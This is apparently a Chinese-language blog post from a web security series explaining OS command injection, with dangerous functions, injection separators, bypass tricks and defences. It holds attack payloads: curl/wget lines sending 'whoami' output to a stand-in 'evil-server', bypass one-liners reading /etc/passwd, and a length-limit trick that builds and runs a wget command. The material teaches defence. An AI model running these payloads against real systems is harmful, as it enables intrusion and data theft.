---
layout: post
title:  web 安全系列-09-command injection 命令注入
date:  2020-08-09 10:37:20 +0800
categories: [web]
tags: [web, web-safe, sf]
published: true
---

# 命令注入是什么？

命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。

该类漏洞通常出现在调用外部程序完成一些功能的情景下。

比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

# 常见危险函数

## PHP

- system

- exec

- passthru

- shell_exec

- popen

- proc_open

## Python

- system

- popen

- subprocess.call

- spawn


## Java

```java
java.lang.Runtime.getRuntime().exec(command)
```

# 常见注入方式

分号分割

`|| && &` 分割

`|` 管道符

`\r\n %d0%a0` 换行

反引号解析

`$()` 替换

# 无回显技巧

bash反弹shell

DNS带外数据

http带外

```
curl http://evil-server/$(whoami)
wget http://evil-server/$(whoami)
```

无带外时利用 sleep 或其他逻辑构造布尔条件

# 常见绕过方式

## 空格绕过

`<` 符号 `cat<123`

`\t / %09`

`${IFS}` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。

另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

## 黑名单绕过

```
a=l;b=s;$a$b
base64 echo "bHM=" | base64 -d
/?in/?s => /bin/ls
连接符 cat /etc/pass'w'd
未定义的初始化变量 cat$x /etc/passwd
```

## 长度限制绕过

```
>wget\
>foo.\
>com
ls -t>a
sh a
```

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令。

这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候, 是不存在标准输入流的，所以可以直接创建文件

# 防御

1. 不使用时禁用相应函数

2. 尽量不要执行外部的应用程序或命令

3. 做输入的格式检查

4. 转义命令中的所有shell元字符

shell元字符包括 ```#&;`,|*?~<>^()[]{}$\```

# 拓展阅读 

[web 安全系列](https://houbb.github.io/2020/08/09/web-safe-00-overview)

# 参考资料

[命令注入](https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html#)

[巧用命令注入的N种方式](https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)

[命令注入漏洞](https://wintrysec.github.io/2020/02/28/Web%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)

[Web 安全漏洞之 OS 命令注入](https://zhuanlan.zhihu.com/p/48536948)

* any list
{:toc}